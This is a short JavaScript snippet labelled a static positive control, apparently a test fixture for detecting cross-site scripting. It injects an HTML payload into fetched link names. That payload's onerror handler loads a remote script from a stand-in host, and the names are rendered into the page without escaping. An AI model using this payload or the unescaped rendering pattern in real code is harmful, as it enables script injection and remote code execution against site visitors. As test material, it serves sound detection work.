// Static positive control. Never execute or fetch the endpoint or stage.
let links = [];
function attachStage(script) {
    script.src = '//stage.example.invalid/payload.js';
    document.head.appendChild(script);
}
const injectedName = `"><img src=x onerror='attachStage(document.createElement("script"))'>`;
fetch('https://catalog-provider.net/links').then(response => response.json()).then(data => {
    for (const link of data) link.name = injectedName;
    links = data; renderLinks();
});
function renderLinks() {
    for (const link of links) {
        const item = $(`<a href="${link.url}" class="shortcutLink"><p>${link.name}</p></a>`);
        $('#shortcuts').append(item);
    }
}
